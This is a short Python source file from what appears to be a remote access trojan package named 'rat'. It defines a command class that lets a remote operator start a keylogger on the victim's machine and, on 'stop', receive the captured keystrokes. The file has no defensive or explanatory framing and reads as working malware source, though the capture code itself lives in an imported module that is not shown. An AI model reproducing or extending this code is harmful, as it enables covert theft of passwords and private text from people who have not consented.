from rat.commands.base_command import BaseCommand
from rat.client.keylogger_service import KeyloggerService


class KeyloggerCommand(BaseCommand):

    name = "keylogger"
    description = "Start or stop the keylogger"

    _service = KeyloggerService()

    def execute(self, args: str) -> str:

        args = args.strip().lower()

        if args == "start":
            result = self._service.start()

            return f"TEXT\n{result}\nEOF"

        if args == "stop":

            data = self._service.stop()

            return f"KEYLOG\nOK\n{data}\nEOF"

        return "TEXT\nUsage:\n" "keylogger start\n" "keylogger stop\n" "EOF"
